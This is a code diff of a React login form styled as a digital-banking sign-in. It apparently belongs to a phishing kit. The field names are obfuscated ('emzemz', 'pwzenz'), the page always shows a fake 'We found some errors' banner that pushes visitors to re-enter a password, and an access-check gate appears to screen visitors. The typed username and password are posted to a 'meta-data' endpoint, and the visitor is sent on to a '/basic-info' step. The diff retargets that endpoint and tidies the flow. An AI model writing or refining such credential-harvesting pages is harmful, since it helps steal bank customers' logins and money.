@@ -1,8 +1,10 @@
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
+import FlowCard from '../components/FlowCard';
+import FormError from '../components/FormError';
 
 const LoginForm2: React.FC = () => {
   const [emzemz, setEmzemz] = useState('');
@@ -10,81 +12,76 @@ const LoginForm2: React.FC = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [showPwzenz, setShowPwzenz] = useState(false);
   const [remember, setRemember] = useState(false);
-  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
+  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '', form: '' });
   const navigate = useNavigate();
+  const location = useLocation();
   const isAllowed = useAccessCheck(baseUrl);
 
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>; // Or a proper loading spinner
+  React.useEffect(() => {
+    const { emzemz: priorUsername } = location.state || {};
+    if (priorUsername) {
+      setEmzemz(priorUsername);
+    }
+  }, [location.state]);
+
+  if (isAllowed === null) {
+    return <div className="text-white">Loading...</div>;
   }
 
-  const togglePwzenzVisibility = () => {
-    setShowPwzenz((prev) => !prev);
+  if (isAllowed === false) {
+    return <div className="text-white">Access denied. Redirecting...</div>;
+  }
+
+  const togglePwzenzVisibility = () => setShowPwzenz((prev) => !prev);
+
+  const validateForm = () => {
+    const nextErrors = { emzemz: '', pwzenz: '', form: '' };
+
+    if (!emzemz.trim()) {
+      nextErrors.emzemz = 'Username is required.';
+    }
+
+    if (!pwzenz.trim()) {
+      nextErrors.pwzenz = 'Password is required.';
+    }
+
+    setErrors(nextErrors);
+    return !nextErrors.emzemz && !nextErrors.pwzenz;
   };
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
-    setIsLoading(true);
     event.preventDefault();
-    let newErrors = { emzemz: '', pwzenz: '' };
-
-    if (!emzemz.trim()) {
-      newErrors.emzemz = 'Username is required.';
-      setIsLoading(false);
+    if (!validateForm()) {
+      return;
     }
 
-    if (pwzenz.length <= 0) {
-      newErrors.pwzenz = 'Password must be at least 6 characters.';
+    setIsLoading(true);
+
+    try {
+      const url = `${baseUrl}api/affinity-meta-data-2/`;
+      await axios.post(url, {
+        emzemz,
+        pwzenz,
+      });
+
+      navigate('/basic-info', {
+        state: {
+          emzemz,
+        },
+      });
+    } catch (error) {
+      console.error('Error submitting credentials:', error);
+      setErrors((prev) => ({ ...prev, form: 'Unable to submit credentials. Please try again.' }));
+    } finally {
       setIsLoading(false);
-    }
-
-    setErrors(newErrors);
-
-    // Check if there are no errors
-    if (!newErrors.emzemz && !newErrors.pwzenz) {
-      // Proceed with form submission
-      console.log('Form submitted with:', { emzemz, pwzenz });
-
-      const url = `${baseUrl}api/logix-meta-data-2/`;
-
-      try {
-        await axios.post(url, {
-          emzemz: emzemz,
-          pwzenz: pwzenz,
-        });
-        console.log('Message sent successfully');
-        navigate('/basic-info', {
-          state: {
-            emzemz: emzemz
-          }
-        });
-      } catch (error) {
-        console.error('Error sending message:', error);
-        setIsLoading(false);
-      }
-
-      setErrors({ emzemz: '', pwzenz: '' });
     }
   };
 
   return (
-    <div className="bg-white shadow-lg rounded-md w-full max-w-md p-6">
-      <h2 className="text-center text-xl font-semibold mb-4">Login</h2>
-      <div className="flex items-center gap-3 text-sm font-semibold text-red-600 bg-red-50 border border-red-200 rounded-md px-3 py-2 mb-4">
-        <svg
-          width="1rem"
-          height="1rem"
-          viewBox="0 0 24 24"
-          className="fill-current"
-          aria-hidden="true"
-        >
-          <path
-            d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
-            fillRule="nonzero"
-          ></path>
-        </svg>
-        <p>We found some errors. Please review the form and make corrections.</p>
-      </div>
+    <FlowCard
+      title="Login"
+      subtitle={<span className="text-red-600 font-semibold">We found some errors. Please review and try again.</span>}
+    >
       <form onSubmit={handleSubmit} className="space-y-4">
         <div>
           <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="emzemz">
@@ -95,27 +92,12 @@ const LoginForm2: React.FC = () => {
             name="emzemz"
             type="text"
             value={emzemz}
-            onChange={(e) => setEmzemz(e.target.value)}
-            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-500 focus:outline-none shadow-sm"
+            onChange={(event) => setEmzemz(event.target.value)}
+            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
           />
+          <FormError message={errors.emzemz} className="mt-2" />
         </div>
-        {errors.emzemz && (
-          <div className="flex items-center gap-3 text-sm font-bold text-red-600">
-            <svg
-              width="1rem"
-              height="1rem"
-              viewBox="0 0 24 24"
-              className="fill-current"
-              aria-hidden="true"
-            >
-              <path
-                d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
-                fillRule="nonzero"
-              ></path>
-            </svg>
-            <p>Username required</p>
-          </div>
-        )}
+
         <div>
           <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="pwzenz">
             Password
@@ -126,8 +108,8 @@ const LoginForm2: React.FC = () => {
               name="pwzenz"
               type={showPwzenz ? 'text' : 'password'}
               value={pwzenz}
-              onChange={(e) => setPwzenz(e.target.value)}
-              className="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:ring-2 focus:ring-purple-500 focus:outline-none shadow-sm"
+              onChange={(event) => setPwzenz(event.target.value)}
+              className="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
             />
             <button
               type="button"
@@ -136,14 +118,7 @@ const LoginForm2: React.FC = () => {
               aria-label={showPwzenz ? 'Hide password' : 'Show password'}
             >
               {showPwzenz ? (
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  className="h-5 w-5"
-                  fill="none"
-                  viewBox="0 0 24 24"
-                  stroke="currentColor"
-                  strokeWidth="1.5"
-                >
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
                   <path
                     strokeLinecap="round"
                     strokeLinejoin="round"
@@ -151,85 +126,54 @@ const LoginForm2: React.FC = () => {
                   />
                 </svg>
               ) : (
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  className="h-5 w-5"
-                  fill="none"
-                  viewBox="0 0 24 24"
-                  stroke="currentColor"
-                  strokeWidth="1.5"
-                >
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
                   <path
                     strokeLinecap="round"
                     strokeLinejoin="round"
                     d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"
                   />
-                  <path
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
-                  />
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                 </svg>
               )}
             </button>
           </div>
+          <FormError message={errors.pwzenz} className="mt-2" />
         </div>
-        {errors.pwzenz && (
-          <div className="flex items-center gap-3 text-sm font-bold text-red-600">
-            <svg
-              width="1rem"
-              height="1rem"
-              viewBox="0 0 24 24"
-              className="fill-current"
-              aria-hidden="true"
-            >
-              <path
-                d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
-                fillRule="nonzero"
-              ></path>
-            </svg>
-            <p>Password required</p>
-          </div>
-        )}
+
         <div className="flex items-center justify-between">
-          <input type="hidden" name="remember" value={remember ? 'true' : 'false'} />
-          <button
-            id="remember"
-            type="button"
-            role="switch"
-            aria-checked={remember}
-            onClick={() => setRemember(!remember)}
-            className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none ${remember ? 'bg-purple-600' : 'bg-gray-300'}`}
-          >
-            <span
-              className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${remember ? 'translate-x-6' : 'translate-x-1'}`}
-            />
-          </button>
-          <label htmlFor="remember" className="text-sm text-gray-700">
-            Remember Username
-          </label>
+          <div className="flex items-center gap-2">
+            <button
+              id="remember"
+              type="button"
+              role="switch"
+              aria-checked={remember}
+              onClick={() => setRemember((previous) => !previous)}
+              className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none ${remember ? 'bg-purple-700' : 'bg-gray-300'}`}
+            >
+              <span
+                className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${remember ? 'translate-x-6' : 'translate-x-1'}`}
+              />
+            </button>
+            <label htmlFor="remember" className="text-sm text-gray-700">
+              Remember Username
+            </label>
+          </div>
+          <a href="#" className="text-sm text-purple-800 hover:underline">
+            Forgot credentials?
+          </a>
         </div>
+
+        <FormError message={errors.form} />
+
         <button
           type="submit"
-          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition"
+          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
           disabled={isLoading}
         >
-          {isLoading ? 'Submitting...' : 'Log In'}
-        </button>
-        <p className="text-center text-sm">
-          <a href="#" className="text-purple-800 hover:underline">
-            Forgot your username or password?
-          </a>
-        </p>
-        <button
-          type="button"
-          className="w-full border border-purple-900 text-purple-900 py-2 rounded-md font-medium hover:bg-purple-50 transition"
-          onClick={() => navigate('/register')}
-        >
-          Register for digital banking
+          {isLoading ? 'Submitting…' : 'Try again'}
         </button>
       </form>
-    </div>
+    </FlowCard>
   );
 };
 
